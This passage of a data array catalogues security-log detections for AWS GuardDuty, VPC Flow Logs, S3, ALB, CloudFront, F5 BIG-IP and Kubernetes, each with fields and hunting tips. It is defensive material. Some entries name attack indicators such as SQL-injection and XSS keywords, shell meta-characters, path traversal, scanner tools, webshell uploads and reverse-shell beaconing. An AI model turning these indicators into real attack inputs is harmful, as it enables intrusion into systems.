{"n":"EC2 running a cryptocurrency mining tool","d":"An EC2 instance makes a network connection to an IP address associated with a Bitcoin/cryptocurrency mining pool, indicating the resource has been hijacked for crypto mining.","f":"type: CryptoCurrency:EC2/BitcoinTool.B\nresource.instanceDetails.instanceId: suspected mining instance\nservice.action.networkConnectionAction.remoteIpDetails.ipAddressV4: mining pool IP\nservice.action.networkConnectionAction.remotePortDetails.port: port used to connect to the pool\nservice.resourceRole: TARGET or ACTOR\nservice.count: number of connections to the pool in the window","h":"Check for abnormal CPU usage on the instance, enumerate running processes, and determine the initial access vector (vulnerable app, leaked key, unsafe AMI)."},

{"n":"S3 data accessed from a known malicious IP (suspected exfiltration)","d":"An IP address on a known threat list performs data-read API calls (GetObject) against an S3 bucket in an unusual pattern, indicating possible data exfiltration.","f":"type: Exfiltration:S3/MaliciousIPCaller\nresource.s3BucketDetails[].name: accessed bucket\nservice.action.awsApiCallAction.api: API called (e.g. GetObject)\nservice.action.awsApiCallAction.remoteIpDetails.ipAddressV4: malicious caller IP\nservice.additionalInfo.threatListName: threat-intel source matched\nservice.count: number of API calls in the window","h":"Cross-reference the bucket's CloudTrail data events to see the total volume of data downloaded and trace which credential was used to make the calls."},

{"n":"CloudTrail logging disabled","d":"An IAM principal calls the StopLogging or DeleteTrail API to disable or remove a CloudTrail trail, typically a defense-evasion step taken right before further malicious activity.","f":"type: Stealth:IAMUser/CloudTrailLoggingDisabled\nresource.accessKeyDetails.userName: principal performing the action\nservice.action.awsApiCallAction.api: StopLogging or DeleteTrail\nservice.action.awsApiCallAction.remoteIpDetails.ipAddressV4: source IP of the call\nservice.action.awsApiCallAction.affectedResources: the affected trail\nseverity: default Low, but very high practical significance for hunters","h":"Treat this as a top-priority signal: re-enable logging immediately, lock the credential that was used, and review all of that principal's activity right before and after this event."},

{"n":"Anomalous IAM user behavior (privilege escalation)","d":"An IAM principal invokes privilege-escalation-capable APIs (e.g. AttachUserPolicy, CreateAccessKey for another user, PutRolePolicy) in a manner that deviates from its own behavioral baseline.","f":"type: PrivilegeEscalation:IAMUser/AnomalousBehavior\nresource.accessKeyDetails.userName / principalId: principal performing the action\nservice.action.awsApiCallAction.api: privilege-escalation API called\nservice.action.awsApiCallAction.serviceName: affected AWS service (e.g. iam.amazonaws.com)\nservice.additionalInfo.recentApiCalls: related recent API call chain\nseverity: Medium by default","h":"Verify whether the policy change went through an approved change process; if not, revoke the newly granted permission and investigate that principal's entire session."},

{"n":"Port scan (REJECT bursts)","d":"A single srcaddr sends bursts of connections to many distinct dstports on one or more dstaddr in a short window, all logged with action=REJECT, a classic external port-scan pattern.","f":"srcaddr: source IP performing the scan\ndstaddr: destination IP being probed\ndstport: attempted destination port (many distinct values)\nprotocol: IP protocol number (6=TCP, 17=UDP)\naction: REJECT means blocked by security group/NACL\npackets/bytes: typically very small (1 packet, ~40-60 bytes) since no handshake completes","h":"Count distinct dstports per srcaddr/dstaddr pair within a short window, then correlate the source IP against threat intel and GuardDuty findings (e.g. Recon:EC2/PortProbeUnprotectedPort)."},

{"n":"Internal network discovery scan","d":"An internal IP address connects to a large number of distinct internal dstaddr values across common service ports (22, 445, 3389, 135) in a short period, suggesting an already-compromised host enumerating internal services.","f":"srcaddr: internal IP suspected of being compromised\ndstaddr: many distinct internal addresses being probed (same or different subnets)\ndstport: common service ports being tried\nprotocol: IP protocol used for probing (usually TCP = 6)\naction: both ACCEPT and REJECT are meaningful (REJECT = blocked by SG/NACL, ACCEPT = service exists and responded)","h":"Compare the srcaddr against the known network segmentation map (which hosts should talk to which); if it deviates from baseline, check EDR and running processes on the source host."},

{"n":"Admin port accepted from the internet","d":"Traffic to port 22 (SSH) or 3389 (RDP) from any public IP outside the internal CIDR range is logged with action=ACCEPT, indicating a security group permits direct administrative access from the internet.","f":"dstport: 22 or 3389 (admin port)\nsrcaddr: public IP address outside the organization's internal range\ndstaddr: the instance whose admin port is exposed\naction: ACCEPT confirms the security group/NACL allowed it\npackets/bytes: session size; a longer-lived session may indicate a successful login","h":"Identify the security group attached to the ENI, check whether a 0.0.0.0/0 ingress rule exists for port 22/3389, and correlate with CloudTrail (AuthorizeSecurityGroupIngress) and OS login logs at the same time."},

{"n":"Unusual lateral movement between subnets (RDP/SSH)","d":"ACCEPT connections on port 3389/22/445 appear between two subnets that do not normally communicate in the baseline (e.g. web tier to database tier), suggesting an attacker using a legitimate remote-access protocol to move laterally.","f":"srcaddr: address in the source subnet (e.g. web tier)\ndstaddr: address in the destination subnet that should not normally receive this traffic (e.g. db tier)\ndstport: 3389 (RDP), 22 (SSH), or 445 (SMB)\naction: ACCEPT means the connection was established\nbytes/packets: session volume; a long session may indicate an actual interactive session","h":"Compare the source/destination subnet pair against the approved network segmentation map, and check for login events on the destination host (Windows Security 4624 Logon Type 10, or sshd Accepted) at the same timestamp as the flow."},

{"n":"Unusually high-volume egress (possible exfiltration)","d":"An internal ENI transfers an unusually large volume of bytes/packets to an external dstaddr compared to its normal baseline, a possible sign of data exfiltration over an ordinary protocol (HTTPS, FTP, etc).","f":"srcaddr: internal address sending the data\ndstaddr: external IP address outside the organization\nbytes: total bytes transferred in the flow, abnormally high versus baseline\npackets: corresponding packet count\ndstport: destination port (443, 21, or an unusual port)\nstart/end: time window of the transfer","h":"Compare the total bytes for the srcaddr/dstaddr pair against a 30-day baseline, check the dstaddr against threat intel/allowlists, and correlate with CloudTrail S3/Secrets Manager access from the same account/role at the same time."},

{"n":"DNS tunneling pattern","d":"UDP/53 traffic between a srcaddr and a dstaddr shows an abnormally high total byte count or query volume compared to normal DNS lookups, suggesting DNS is being used as a C2 or exfiltration channel.","f":"dstport: 53 (DNS)\nprotocol: 17 (UDP)\nsrcaddr: internal host generating abnormal DNS queries\ndstaddr: DNS resolver/server receiving the queries (internal or external)\nbytes: total bytes abnormally high versus the typical ~100 bytes per DNS query\npackets: number of packets/queries within a short window","h":"Compare total bytes/query count per srcaddr-dstaddr pair against normal DNS baselines, and cross-reference the queried domain names in Route 53 Resolver query logs for the same timeframe."},

{"n":"Protocol tunneling / beaconing over an allowed port","d":"An internal host produces repeating egress flows to the same dstaddr over an allowed port such as 443 or 22, with small, consistently periodic byte volumes, suggesting protocol tunneling (e.g. a TLS-wrapped reverse shell or SSH tunnel) to evade network controls.","f":"srcaddr: internal host suspected of beaconing\ndstaddr: fixed external IP receiving the beacon\ndstport: an allowed port (443 or 22) used to blend in\nbytes: small and nearly constant volume across flows\nstart/end: interval between consecutive flows is nearly fixed (low jitter)","h":"Check for low jitter in the time intervals between flows to the same dstaddr, cross-reference the dstaddr against threat intel/TLS JA3 fingerprints, and review preceding DNS queries to see what domain was resolved."},

{"n":"S3: Anonymous GetObject Success","d":"An unauthenticated GetObject request (Requester = \"-\") returns HTTP 200 against a sensitive bucket/key, indicating the bucket or object is publicly readable and data may already be exposed.","f":"Requester: \"-\" means the request carried no IAM identity (anonymous)\nOperation: REST.GET.OBJECT is an object download\nKey: the object path accessed — the more sensitive, the worse\nHTTP_status: 200 means the request succeeded and was not denied\nAuthentication_Type: \"-\" confirms no SigV4/SigV2 signature was used","h":"Filter for all records with Requester = \"-\" and HTTP_status = 200 on buckets expected to hold internal or sensitive data."},

{"n":"S3: Key Enumeration Causing AccessDenied Spike","d":"A single IP/requester generates a large number of REST.GET.OBJECT requests returning 403 AccessDenied across many distinct Key values in a short window, suggesting enumeration of object/bucket names to find exposed resources.","f":"Remote_IP: the source generating the burst of guesses\nKey: the guessed object name, often from a wordlist (backup, db, config...)\nHTTP_status / Error_Code: 403 / AccessDenied shows the request was denied\nUser-Agent: typically an automated tool/scanner rather than a browser","h":"Group by Remote_IP and count distinct Key values with HTTP_status 403 in a short window, alerting above a threshold."},

{"n":"S3: Bulk GetObject Pattern Suggesting Data Transfer Out","d":"An assumed role/IAM principal issues a very high volume of REST.GET.OBJECT calls across many sensitive objects (PII exports, archives) in a short window, consistent with staging data for transfer to another account or external destination.","f":"Requester: the assumed-role ARN making the request, compared to its normal baseline\nOperation: REST.GET.OBJECT repeated at high volume\nBytes_Sent / Object_Size: unusually large aggregate volume downloaded\nKey: the objects accessed, especially exports/backup/PII prefixes","h":"Aggregate object count and total Bytes_Sent per Requester over a 1-hour window, alert when it greatly exceeds historical baseline."},

{"n":"ALB: Attack Payload Reaches Backend Despite WAF","d":"A request carrying a SQL injection/XSS payload in the URL is forwarded (actions_executed=\"forward\") and the backend returns target_status_code 200, indicating the payload was not blocked by WAF and may have successfully exploited the application.","f":"request: the request line containing the attack string (UNION SELECT, <script>...)\nactions_executed: \"forward\" means the request reached the target, not blocked by \"waf\"\ntarget_status_code: 200 means the application processed and responded successfully\nelb_status_code: the status code the ALB returned to the client\nuser_agent: automated exploitation tools often leave a distinctive signature","h":"Filter requests containing common attack keywords in the request field, combined with target_status_code 200 and actions_executed not containing \"waf\"."},

{"n":"ALB: Request Classified Severe — Possible HTTP Request Smuggling","d":"The ALB tags classification=\"Severe\" (e.g. classification_reason=\"BothTeClPresent\") for a request that violates RFC 7230, a classic indicator of a desync/HTTP request smuggling attempt against a public-facing application.","f":"classification: \"Severe\" means the request severely violates RFC 7230\nclassification_reason: the specific reason code, e.g. BothTeClPresent (both Transfer-Encoding and Content-Length present)\nrequest_processing_time: -1 indicates the ALB could not dispatch the request to a target\nelb_status_code: the error code the ALB returned (usually 400) when rejecting the malformed request","h":"Filter all requests where classification is not \"-\" (Ambiguous or Severe) and track by client_ip to spot repeated desync probing."},

{"n":"CloudFront: Attack Pattern in URI/Query String","d":"Multiple CloudFront requests contain path-traversal or SQL-injection strings in cs-uri-stem/cs-uri-query and return sc-status 403/404 with x-edge-result-type=Error, indicating vulnerability scanning against the application behind the CDN.","f":"cs-uri-stem: the request path, containing ../ or sensitive system paths\ncs-uri-query: the query string, possibly carrying a SQLi/XSS payload\nsc-status: 403/404 indicates denied or not found\nx-edge-result-type: \"Error\" when the response is in the 4xx/5xx range\ncs(User-Agent): often a scanning tool (sqlmap, nikto...)","h":"Filter by c-ip with a high count of sc-status 403/404 combined with payload indicators in cs-uri-stem or cs-uri-query within a short window."},

{"n":"CloudFront: Probing Private Content Without Valid Signed URL","d":"Repeated requests to the same private-content path (which requires a signed URL/signed cookie) are missing or have invalid signature parameters, returning sc-status 403 with x-edge-detailed-result-type=InvalidRequestBlocked, suggesting attempts at unauthorized access to data stored behind the CDN.","f":"cs-uri-stem: the private content path targeted (e.g. /private/...)\ncs-uri-query: missing or invalid required Signature/Expires/Key-Pair-Id\nsc-status: 403 indicates access was denied\nx-edge-detailed-result-type: InvalidRequestBlocked confirms the block was due to access policy\nc-ip: the source making repeated attempts with varying parameters","h":"Group by c-ip and cs-uri-stem, counting sc-status=403 with x-edge-detailed-result-type=InvalidRequestBlocked above a threshold within a short window."},

{"n":"Attack Signature Detected","d":"ASM matches request/response content against its attack signature database (SQL injection, XSS, command injection, path traversal, etc.) and raises a violation on a match.","f":"sig_ids: Matched attack signature ID\nsig_names: Signature name (e.g. \"SQL-INJ generic\")\nattack_type: Inferred attack category (SQL Injection, Cross Site Scripting...)\nrequest_status: Handling outcome (blocked/alerted/passed)\nsupport_id: Unique reference ID to look up full event detail\nseverity: Severity the policy assigned to the signature","h":"Filter events with request_status=blocked/alerted and attack_type set to find source IPs probing or exploiting the web application."},

{"n":"Illegal Meta Character in Value","d":"ASM detects disallowed special/meta characters (such as ; | \\` ' & $) in a parameter, header, or cookie value per policy, typically indicating injection probing.","f":"violations: Violation name (\"Illegal meta character in value\")\nparam_name / header_name: Parameter/header carrying the offending character\nviolation_details or request: Value/context containing the illegal character\nrequest_status: blocked/alerted/passed\nsrc_ip (ip_client): Source IP of the request\nseverity: Log level (typically \"Error\")","h":"Track frequency of unusual meta-character payloads from the same IP/parameter to spot automated command-injection probing."},

{"n":"Violation Rating Indicates Likely Attack","d":"ASM aggregates all violations in a transaction into a Violation Rating from 1 (likely false positive) to 5 (very likely a real attack); high-rated requests should be prioritized for investigation.","f":"violation_rating: Aggregate 1-5 score of likelihood this is a real attack\nviolations: List of violations contributing to the score\nattack_type: Suspected attack category (if any)\nrequest_status: blocked/alerted/passed\nsupport_id: Reference ID to look up full event detail\nip_client: Source IP of the request","h":"Prioritize immediate investigation of requests with violation_rating 4 or 5, especially when request_status is not blocked."},

{"n":"HTTP Protocol Compliance Failed","d":"ASM detects requests that violate HTTP RFC compliance (e.g. bad HTTP version, duplicate/missing Host header, invalid Content-Length), often abused to evade inspection or perform request smuggling.","f":"violations: Violation name (\"HTTP protocol compliance failed\")\nviolation_details: Specific RFC compliance failure (e.g. \"Bad HTTP version\")\nrequest_status: blocked/alerted/passed\nmethod, protocol: Request's HTTP method and protocol version\nip_client: Source IP of the request\nsupport_id: Reference ID to look up full event detail","h":"Look for repeated RFC-compliance violations clustered from the same source, indicating automated scanning tools or request-smuggling attempts."},

{"n":"Illegal File Type Upload","d":"ASM blocks file uploads whose extension or MIME type is not on the policy's allow list, commonly preventing webshell or executable uploads.","f":"violations: Violation name (\"Illegal file type\")\nfile_name / file_type: Name and detected type of the uploaded file\nrequest_status: blocked/alerted/passed (default violation rating is 5, usually blocked)\nuri: Upload-receiving endpoint\nip_client: Source IP performing the upload\nsupport_id: Reference ID to look up full event detail","h":"Review any blocked file_name with executable extensions (.php, .jsp, .asp, .exe) on upload endpoints to detect webshell-planting attempts."},

{"n":"Bot Defense / Automated Client Detected","d":"ASM's Bot Defense / Bot Signatures use JavaScript challenges and bot signatures to identify spoofed browsers or automated tools scanning, scraping, or probing the application.","f":"bot_signature_name: Matched bot signature name (e.g. \"curl\", \"headless-browser\")\nbot_category / bot_anomalies: Bot classification (malicious/benign/unknown) or detected anomaly\nrequest_status (action): block/alarm/none per profile configuration\nuser_agent: Client's User-Agent string\nip_client: Client source IP\nsupport_id: Reference ID to look up full event detail","h":"Track IPs repeatedly flagged bot_category=Malicious Bot across many distinct URIs in a short window, indicating automated scanning ahead of an attack."},

{"n":"Brute Force Attack Detected","d":"ASM's Brute Force/Login attack protection detects failed-login counts or login-page request rates exceeding configured thresholds, indicating password guessing or credential stuffing attempts.","f":"violations / event: \"Brute Force Attack\" start/ongoing/stop\nlogin_url: Targeted login page URL\nip_client: Source IP (or set of IPs if distributed)\nusername: Account name being attempted (if session-based tracking is enabled)\nrequest_status (action): alarm/block per configuration\nsupport_id: Reference ID to look up full event detail","h":"Correlate \"Brute Force Attack started\" events with failed-login counts on the same username/IP to distinguish single-source password guessing from distributed credential stuffing."},

{"n":"Evasion Technique Detected","d":"ASM detects a client deliberately using unusual encoding or formatting (directory traversal, Unicode/double encoding, self-reference paths, etc.) to evade WAF signature inspection or filtering.","f":"violations: Violation name (\"Evasion technique detected\")\nviolation_details: Specific evasion technique (e.g. \"Directory traversal\", \"%u decoding\")\nrequest_status: blocked/alerted/passed\nuri / request: Request path/content containing the evasion string\nip_client: Source IP of the request\nsupport_id: Reference ID to look up full event detail","h":"Correlate evasion violations with other violations on the same request (commonly paired with Attack Signature Detected) to uncover the real payload hidden behind the encoding."},

{"n":"Request Length Exceeds Defined Buffer Size","d":"ASM blocks a request/parameter/header whose length exceeds the policy's configured limit, a possible indicator of a buffer-overflow exploitation attempt or application-layer DoS.","f":"violations: Violation name (\"Request length exceeds defined buffer size\")\nviolation_details: Component that exceeded the limit (request/header/parameter) and its actual length\nrequest_status: blocked/alerted/passed\nmethod, uri: Request method and target endpoint\nip_client: Source IP of the request\nsupport_id: Reference ID to look up full event detail","h":"Cross-reference blocked oversized requests with known buffer-overflow CVEs in the backend application/library running behind the WAF."},

{"n":"ASM Policy Set to Transparent Mode / Blocking Disabled","d":"The ASM policy's Enforcement Mode is switched to Transparent, or Block actions are disabled on violations, so attack traffic is only logged/alerted and no longer actually blocked — a key indicator of defenses being impaired.","f":"policy_name: Name of the policy that was changed\nenforcement_mode: Current value (Blocking/Transparent)\nrequest_status: alerted instead of blocked despite a severe violation occurring\nviolation_rating/violations: Violations that should have been blocked but were only alerted\nchanged_by (audit log /var/log/audit): Account that made the configuration change\nsupport_id: Reference ID for the related event","h":"Alert immediately whenever enforcement_mode flips to Transparent or a Block action is removed from a production policy, especially right before a surge of severe violations logged as request_status=alerted."},

{"n":"SSL/TLS Handshake Failure","d":"BIG-IP LTM logs an error during the SSL/TLS handshake (unsupported protocol version or certificate verification failure), which can indicate scanning for weak TLS configurations or an adversary-in-the-middle presenting a forged certificate.","f":"tmm<N>[PID]: TMM process handling the SSL session that logged the event\n01260009:4: message ID and severity (warning)\nssl_hs_rxhello / ssl_shim_vfycerterr: SSL function where the handshake error occurred\nunsupported version(<code>) / application verification failure(46): specific cause of the failure\nclient_IP:client_port -> virtual_IP:virtual_port: connection source and destination virtual server (seen in the related 01260013 variant)","h":"Watch for a single source IP generating repeated SSL handshake failures across multiple virtual servers in a short window, a sign of a TLS scanning tool."},

{"n":"Pool Member Marked Down","d":"An LTM health monitor detects a pool member failing to respond correctly and transitions it to \"down\" status, reducing or eliminating the pool's traffic-serving capacity - a denial-of-service attack against the backend should be ruled out.","f":"mcpd[PID]: configuration management daemon logging the event\n01070638:5: message ID and severity (notice)\nPool /Partition/poolname: pool containing the affected member\nmember IP:port: address and port of the pool member\nmonitor status down: the member's new status\nlast error: <monitor>: <reason>: which monitor failed and why","h":"Correlate the pool member down timestamp with traffic spikes or firewall logs to rule out a DoS attack targeting the backend."},

{"n":"Virtual Server Disabled via Configuration Change","d":"A production-serving virtual server is disabled by a user, which may be legitimate maintenance or a sabotage/compromised-admin action intended to disrupt service availability.","f":"mcpd[PID]: process logging the configuration change\n01070921:5: message ID and severity (notice)\nVirtual Server '/Partition/vsname': the virtual server that changed\non partition 'Common': partition containing the object\nenabled/disabled: the newly applied status\nby user '<username>': account that made the change","h":"Alert immediately when a production virtual server is disabled outside a scheduled maintenance window, and verify the account that made the change."},

{"n":"Virtual Server Connection Limit Reached","d":"Concurrent connections to a virtual server, pool member, or node reach the configured threshold, causing BIG-IP to reject new connections - a classic indicator of a denial-of-service attack or abnormal traffic.","f":"tmm<N>[PID]: TMM process logging the event\n01200012:4: message ID and severity (warning)\nclient_IP:client_port: source of the rejected connection\nvirtual_IP:virtual_port: destination virtual server address/port\nproto <6|17>: protocol (TCP=6, UDP=17)\nVS <name>: the object (virtual server) that reached its connection limit","h":"If a single IP or small IP range accounts for most connections when the limit trips, suspect a targeted flood attack."},

{"n":"SYN Cookie Activation / SYN Flood Detected","d":"BIG-IP detects the number of half-open (embryonic) TCP connections exceeding a threshold and automatically activates SYN cookie mode to protect system resources - a clear indicator of a SYN flood attack.","f":"tmm<N>[PID]: TMM process detecting and handling the event\n01010240:5 / 01010241:5: message IDs for syncookie mode activation/exit\nserver name = /Partition/vsname: the affected virtual server\nHSB modId: hardware module handling syncookie processing\n01010055:4 Syncookie embryonic connection counter <count> exceeded sys threshold <threshold>: half-open connection count exceeding the system threshold","h":"When syncookie activation appears, immediately inspect the source of SYN traffic to that virtual server to confirm whether it is a genuine SYN flood."},

{"n":"Virtual Server Exceeded Configured Rate Limit","d":"The rate of new connections to a virtual server exceeds the configured rate-limit threshold, typically caused by an abnormal traffic spike from a single source (bot, scraper, or application-layer attack).","f":"tmm<N>[PID]: TMM process logging the threshold breach\n01010251:5: message ID for a virtual server exceeding its rate limit (01010250 is the pool-member equivalent)\nVirtual <name>: the affected virtual server\nexceeded configured rate limit: the alert content","h":"Cross-reference connection logs at the same timestamp to identify which source IP accounts for most of the connections-per-second that caused the breach."},

{"n":"Successful APM VPN/SSO Logon","d":"The Access Policy authenticates the user successfully and grants a remote-access session (Network Access/Portal Access/Webtop); should be baselined to spot anomalies later.","f":"session.logon.last.result: last logon result (1 = success)\nsession.user.name: authenticated username\nsession.client.ip: client source IP address\nsession.ad.last.actualdomain: actual AD domain used for authentication\nsession.policy.result: Access Policy outcome (allowed)\nAccess Policy session ID: APM session identifier (e.g. cd2cabf4)","h":"Correlate the session ID with source IP and logon time against the user's normal behavior to catch account takeover disguised as a normal logon."},

{"n":"Failed/Denied APM Logon","d":"The Access Policy records a failed authentication (bad password, locked AD/LDAP account, etc.); repeated failures from one IP or spread across many accounts may indicate password guessing or spraying.","f":"session.logon.last.result: last logon result (0 = failure)\nsession.logon.last.attempts: logon attempts within the session\nsession.user.name: account name attempted\nsession.client.ip: source IP address\nsession.ad.last.attempts: AD authentication attempt count\nsession.policy.result: Access Policy outcome (access_denied)","h":"Filter by session.client.ip or IP range with an unusually high session.logon.last.attempts count in a short window, spread across multiple distinct accounts."},

{"n":"MFA / Client Certificate Check Failed","d":"The user passes the first-factor password check but fails the MFA step or client-certificate check (On-Demand Cert Auth), suggesting an attacker using a stolen but valid first-factor credential.","f":"session.logon.last.result: first-factor authentication result (1 = success)\nsession.ssl.cert.x509extension: client X.509 certificate data (empty/invalid on failure)\nsession.user.name: username\nsession.client.ip: source IP address\nAccess Policy agent: name of the MFA/Cert Auth branch that fell through to Deny\nsession.policy.result: Access Policy outcome (access_denied)","h":"Watch for sessions that clear the password step but repeatedly fail the MFA/Cert step in a short window, especially from unfamiliar IPs or devices."},

{"n":"Endpoint Posture/Compliance Check Failed","d":"The Access Policy denies the session because the endpoint fails a compliance check (missing antivirus/firewall, missing patches), typically an unmanaged personal device or one with protections deliberately disabled to bypass controls.","f":"session.check_software.last.av.count: number of antivirus products detected\nsession.check_software.last.av.item_1.state: antivirus enabled/disabled state\nsession.windows_check_process.last.result: result of the required process check\nsession.user.name: username\nsession.client.ip: source IP address\nsession.policy.result: Access Policy outcome (access_denied)","h":"Track posture-check failure rate per user/device over time; a sudden spike or repeated failures from one account is worth investigating."},

{"n":"Logon from Anomalous Country / Impossible Travel","d":"The Access Policy's IP Geolocation Match flags a logon from a high-risk country, or two sessions from geographically distant locations within a time window that makes real travel impossible, indicating likely account compromise.","f":"session.user.ipgeolocation.country_name: country resolved from the client IP\nsession.user.ipgeolocation.country_code: country code\nsession.client.ip: session source IP address\nsession.user.name: username\nsession.logon.last.result: authentication result (1 = success despite anomalous location)\nAccess Policy agent: IP Geolocation Match branch taken (Deny/alert)\n","h":"Correlate session.user.ipgeolocation.country_code and session.client.ip across consecutive sessions for the same account to spot travel distance/time that is not physically possible."},

{"n":"Concurrent User Session Limit Exceeded","d":"APM rejects a new session because the account has reached its configured Max Sessions Per User limit (or the global license limit is reached), which can indicate shared/leaked credentials or an account being used from two places at once.","f":"session.user.name: account blocked for exceeding the session limit\nsession.client.ip: source IP of the new session request\nMax Sessions Per User: current active session count vs. configured limit\nAccess Policy result: rejection due to the session limit\nsession.assigned.uuid: UUID of the active sessions already open","h":"When an account repeatedly hits the concurrent-session limit from different IPs/locations in a short period, verify directly with the user and review the currently open sessions."},

{"n":"New Admin User Created","d":"A new BIG-IP auth user account is created with Administrator role across all partitions, granting full device management privileges.","f":"client: origin of the change (tmsh = CLI, tmui = web GUI)\nuser: the already-authenticated account that issued the create command\ntransaction: config transaction id (#id-n), groups changes made together\ncreate { auth_user {...} }: the created object is an auth_user, with its name\nauth_user_partition_access / role: partition and role assigned (role admin = full control)\nStatus: command execution result (Command OK/fail)","h":"Cross-check every newly created admin account against approved change tickets and expected maintenance windows."},

{"n":"User Role Escalated to Admin","d":"An existing account's role is modified to Administrator, elevating privileges from a restricted role (operator, guest, manager, etc.) to full administrative control.","f":"client: tmsh or tmui that made the change\nuser: the account that ran the modify command (not necessarily the account being changed)\ntransaction: config transaction id\nmodify { auth_user { name ... } }: the target account name being modified\nauth_user_partition_access / role: new role assigned to the target account\nStatus: command execution result","h":"Flag modify auth_user entries where role changes to admin and the acting user differs from the account owner or falls outside the standard access-grant process."},

{"n":"ASM Security Policy Disabled or Weakened","d":"An ASM (WAF) security policy's enforcement mode is switched from Blocking to Transparent, or the policy is detached from a virtual server, removing real-time web attack blocking.","f":"client: tmsh or tmui that made the change\nuser: the account that ran the command\ntransaction: config transaction id\nmodify { asm_policy { name ... } }: the ASM policy object that was modified\nenforcement_mode: new mode (transparent = log-only, no blocking)\nStatus: command execution result","h":"Alert immediately when an ASM policy protecting a production application is switched to transparent or detached from its virtual server outside a maintenance window."},

{"n":"Management Access ACL (SSH/GUI) Widened","d":"The allowed source-IP list for sshd or httpd (management interfaces) is widened to the entire internet (0.0.0.0/0), breaking management-plane access controls.","f":"client: tmsh or tmui that made the change\nuser: the account that ran the command\ntransaction: config transaction id\nmodify { sshd { sshd_allow ... } } / httpd: the management daemon whose ACL was changed\nsshd_allow / httpd_allow: the new allowed IP range(s)\nStatus: command execution result","h":"Diff new sshd_allow/httpd_allow ranges against the approved baseline and alert on 0.0.0.0/0 or unexpected public ranges."},

{"n":"Audit Logging Disabled or Lowered","d":"The config.auditing system DB variable is changed to disable (or lowered from verbose/all down to enable/disable), so subsequent configuration changes stop being logged.","f":"client: tmsh or tmui that made the change\nuser: the account that ran the command (normally requires admin/root)\ntransaction: config transaction id - this is the last AUDIT line about log level before it goes dark\ndb_variable_name: the variable changed (config.auditing)\ndb_variable_value: the new value (disable/enable/verbose/all)\nStatus: command execution result","h":"Treat any config.auditing change to disable (or an unusual prolonged silence in /var/log/audit) as a high-priority indicator requiring immediate investigation."},

{"n":"Virtual Server or Pool Deleted","d":"A virtual server or pool serving production traffic is deleted, which can cause a service outage or indicate sabotage following a compromise.","f":"client: tmsh or tmui that made the change\nuser: the account (or service account) that issued the delete\ntransaction: config transaction id\nobj_delete { virtual {...} } / pool: the object type deleted and its full name (partition/name)\nStatus: command execution result","h":"Cross-check every obj_delete on a production virtual server or pool against an approved change ticket, especially off-hours deletions or ones run by a service account."}
,
{"n":"Controller Manager process log","d":"Logs reconcile activity from the built-in controllers (Node, ReplicaSet, Job, ServiceAccount, etc.) and leader election when running multiple HA replicas.","f":"I/W/E (first character): klog level (Info/Warning/Error)\n1025 hh:mm:ss.microsec: klog's internal timestamp\nthreadid: the logging thread id\nnode_lifecycle_controller.go / garbagecollector.go / range_allocator.go: source file that emitted the log\nmessage: the log text — e.g. Node readiness state (\"master disruption mode\"), garbage-collector progress, or a PodCIDR assignment to a new node","h":"Entering/exiting \"master disruption mode\" repeatedly outside of cluster startup indicates nodes repeatedly losing contact with the control plane — possibly overload, network failure, or a denial-of-service attack targeting the kubelet/API server."},
{"n":"Scheduler process log","d":"Logs pod-to-node placement decisions (bind) and leader election when running HA; warns when no fitting node can be found.","f":"W (first character): klog level — Warning\n1025 hh:mm:ss.microsec: klog's internal timestamp\nthreadid: the logging thread id\nauthentication.go:398/399: source file that emitted the warning\nmessage: the log text — missing --authentication-kubeconfig causes the scheduler to skip authentication on its own endpoint","h":"The \"Continuing without authentication configuration\" warning appears when the scheduler isn't given --authentication-kubeconfig — its metrics/healthz endpoint (10259) then treats every request as anonymous; check whether that endpoint is exposed beyond the node."},
{"n":"kube-proxy process log","d":"Logs the proxy mode (iptables/ipvs/nftables) selected at startup and errors syncing the Service traffic-forwarding rules.","f":"I/E (first character): klog level (Info/Error)\n1025 hh:mm:ss.microsec: klog's internal timestamp\nthreadid: the logging thread id\nserver_linux.go / server.go: source file that emitted the log\nmessage: the log text — e.g. \"Using iptables Proxier\" at startup, or a warning that nodePortAddresses is unrestricted (NodePort accepts connections on every local IP)","h":"An unrestricted nodePortAddresses means every NodePort Service accepts connections on ALL local IPs of the node (including internal management IPs) — a larger attack surface than necessary on a node with multiple network interfaces."}
];
